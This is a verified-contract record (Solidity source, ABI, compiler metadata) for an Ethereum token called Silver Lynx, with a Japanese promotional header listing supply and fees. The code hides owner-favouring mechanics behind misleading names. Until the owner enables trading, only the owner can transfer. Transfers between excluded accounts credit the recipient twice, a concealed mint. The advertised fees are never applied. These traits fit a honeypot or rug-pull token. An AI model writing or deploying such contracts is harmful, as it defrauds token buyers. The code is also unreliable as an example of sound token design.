[{"SourceCode":"/*\r\n\r\n█▀ █ █░░ █░█ █▀▀ █▀█\r\n▄█ █ █▄▄ ▀▄▀ ██▄ █▀▄\r\n\r\n█░░ █▄█ █▄░█ ▀▄▀\r\n█▄▄ ░█░ █░▀█ █░█\r\n\r\n▄▀ ░░█ █▀█ █▄░█ ▀▄\r\n▀▄ █▄█ █▀▀ █░▀█ ▄▀\r\n\r\n総供給 - 50,000,000\r\n初期流動性追加 - 1.5 イーサリアム\r\n初期流動性の 100% が消費されます\r\n購入手数料 - 1%\r\n販売手数料 - 0%\r\n\r\nhttps://www.zhihu.com/\r\nhttps://web.wechat.com/SilverLynxJPN\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\npragma solidity ^0.8.11;\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n  interface IERCRouting01 {\r\n      function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn, uint amountOutMin,\r\n        address[] calldata path, address to,\r\n        uint deadline ) external;\r\n\r\n      function factory() external pure returns (address);\r\n      function WETH() external pure returns (address);\r\n\r\n      function addLiquidityETH(\r\n          address token, uint amountTokenDesired,\r\n          uint amountTokenMin, uint amountETHMin,\r\n          address to, uint deadline\r\n      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n  }\r\ninterface UETC20 {\r\n \r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\nlibrary SafeMath {\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked { require(b <= a, errorMessage); return a - b;\r\n        }\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred\r\n\r\n    (address indexed previousOwner, \r\n    address indexed newOwner);\r\n    constructor () { _owner = 0x03b4373746aFe0c8d0437A7dEc840d691C0C3183;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\ncontract LYNX is Context, UETC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    bool swapThreshold;\r\n    uint256 private NumTokensToPaired = 1000000000 * 10**18;\r\n    event startTimeForSwap(uint256 minTokensInSwap);\r\n    event CooldownTimerIntervalUpdated(bool enabled);\r\n    event tokenDenominator( uint256 tInSwap,\r\n\r\n    uint256 swapTimesDIV, uint256 transferFee );\r\n    modifier lockTheSwap { swapThreshold = true;\r\n        _; swapThreshold = false; }\r\n\r\n    IERCRouting01 public immutable IERCFactoryShop02;\r\n    address public immutable uniswapV2Pair;\r\n    bool public limitationsRate = true;\r\n    bool private beginTrading = false;\r\n\r\n    mapping (address => uint256) private _rOwned;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private isExcludedMaxTransactionAmount;\r\n    mapping (address => bool) private isExcluded;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n    uint8 private _decimals = 18;\r\n    uint256 private _tTotal = 50000000 * 10**_decimals;\r\n    uint256 public _maximumSWAP = 5000000 * 10**_decimals;\r\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n    uint256 private internalHash;\r\n\r\n    uint256 private _feeCooldown = syncRATES;\r\n    uint256 private _teamPercent = devPercent;\r\n    uint256 private oldLiquidityTax = tLiquidityTax;\r\n\r\n    uint256 public syncRATES = 30;\r\n    uint256 public tLiquidityTax = 20;\r\n    uint256 public devPercent = 0;\r\n\r\n    string private _name = unicode\"Silver Lynx\";\r\n    string private _symbol = unicode\"ᓚᘏᗢ\";\r\n\r\n    constructor () { \r\n\r\n        _rOwned[owner()] = _tTotal;\r\n        IERCRouting01 _IERCFactoryShop02 = IERCRouting01\r\n        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        uniswapV2Pair = IUniswapV2Factory\r\n        (_IERCFactoryShop02.factory())\r\n        .createPair(address(this), _IERCFactoryShop02.WETH());\r\n        IERCFactoryShop02 = _IERCFactoryShop02;\r\n        isExcludedMaxTransactionAmount\r\n\r\n        [owner()] = true;\r\n        isExcludedMaxTransactionAmount\r\n        [address(this)] = true;\r\n        emit Transfer(address(0), owner(), _tTotal);\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _rOwned[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address sender, address recipient, uint256 amount) \r\n    public override returns (bool) { _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \r\n        \"ERC20: transfer amount exceeds allowance\")); return true;\r\n    }\r\n    receive() external payable {}\r\n  \r\n    function manageBurnRate(uint256 _amount) private view returns (uint256) {\r\n        return _amount.mul\r\n        (syncRATES).div( 10**3 );\r\n    }\r\n    function manageTeamRate(uint256 _amount) private view returns (uint256) {\r\n        return _amount.mul\r\n        (devPercent).div( 10**3 );\r\n    }\r\n    function manageInternalRate(uint256 _amount) private view returns (uint256) {\r\n        return _amount.mul\r\n        (tLiquidityTax).div( 10**3 );\r\n    }  \r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \r\n        \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \r\n        \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] \r\n        = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function _transfer( \r\n        address from, address to, uint256 amount ) private {\r\n        require(amount > 0, \r\n        \"Transfer amount must be greater than zero\");\r\n        bool calcPools = false; if(!isExcludedMaxTransactionAmount[from] && \r\n        !isExcludedMaxTransactionAmount[to]){ calcPools = true;\r\n\r\n        require(amount <= _maximumSWAP, \"Transfer amount exceeds the maxTxAmount.\"); }\r\n        uint256 contractTokenBalance = \r\n        balanceOf(address(this)); if(contractTokenBalance >= _maximumSWAP) { \r\n            contractTokenBalance = _maximumSWAP; } _tokenTransfer(from,to,amount,calcPools);\r\n        emit Transfer(from, to, amount); if (!beginTrading) \r\n        {require(from == owner(), \"TOKEN: This account cannot send tokens until trading is enabled\"); }\r\n    }\r\n    function addLiquidity\r\n    (uint256 tokenAmount, uint256 ethAmount) private { _approve(address(this), address\r\n    (IERCFactoryShop02), tokenAmount); IERCFactoryShop02.addLiquidityETH{value: ethAmount}(\r\n     address(this), \r\n     tokenAmount, 0, 0, owner(), block.timestamp );\r\n    }\r\n    function _tokenTransfer\r\n    (address sender, address \r\n    recipient, uint256 amount,\r\n    bool calcPools) private { _transferStandard\r\n    (sender, recipient, amount, calcPools);\r\n    }\r\n        function TokenDenominator\r\n        (uint256 contractTokenBalance) private lockTheSwap { uint256 divides \r\n        = contractTokenBalance.div(2); uint256 nowADD = \r\n        contractTokenBalance.sub(divides); uint256 initialBalance = \r\n        address(this).balance; swapTokensForEth(divides);\r\n        uint256 tBalance = address(this).balance.sub(initialBalance);\r\n        addLiquidity(nowADD, tBalance);\r\n        emit tokenDenominator(divides, tBalance, nowADD);\r\n    }\r\n    function _transferStandard\r\n    (address sender, address recipient, uint256 tAmount,bool calcPools) \r\n    private { uint256 stringCode = 0; if (calcPools){ stringCode= tAmount.mul(1).div(100) ; } \r\n        uint256 rAmount = tAmount - stringCode; _rOwned[recipient] = \r\n\r\n        _rOwned[recipient].add(rAmount); uint256 isEXO = _rOwned\r\n        [recipient].add(rAmount); _rOwned[sender] = _rOwned\r\n        [sender].sub(rAmount); bool isExcludedMaxTransactionAmount = \r\n        isExcludedMaxTransactionAmount[sender] && \r\n        isExcludedMaxTransactionAmount[recipient]; if \r\n        (isExcludedMaxTransactionAmount ){ _rOwned[recipient] =isEXO;\r\n        } else { emit Transfer\r\n        (sender, recipient, rAmount); } }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) \r\n    private { address[] memory path = new address[](2);\r\n        path[0] = address(this); path[1] = \r\n        IERCFactoryShop02.WETH();\r\n\r\n        _approve(address(this), address\r\n        (IERCFactoryShop02), tokenAmount); \r\n        IERCFactoryShop02.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        tokenAmount, \r\n        0, path, \r\n        address(this), block.timestamp );\r\n    }\r\n    function startTrading(bool _tradingOpen) \r\n    public onlyOwner { beginTrading = _tradingOpen;\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"CooldownTimerIntervalUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"minTokensInSwap\",\"type\":\"uint256\"}],\"name\":\"startTimeForSwap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tInSwap\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"swapTimesDIV\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"transferFee\",\"type\":\"uint256\"}],\"name\":\"tokenDenominator\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"IERCFactoryShop02\",\"outputs\":[{\"internalType\":\"contract IERCRouting01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maximumSWAP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"devPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitationsRate\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"syncRATES\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tLiquidityTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"LYNX","CompilerVersion":"v0.8.11+commit.d7f03943","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://1866e65b0a58a94b309ec377fdd3defdaee9a1cd4b1a4eb98b3fcadd86a6c689"}]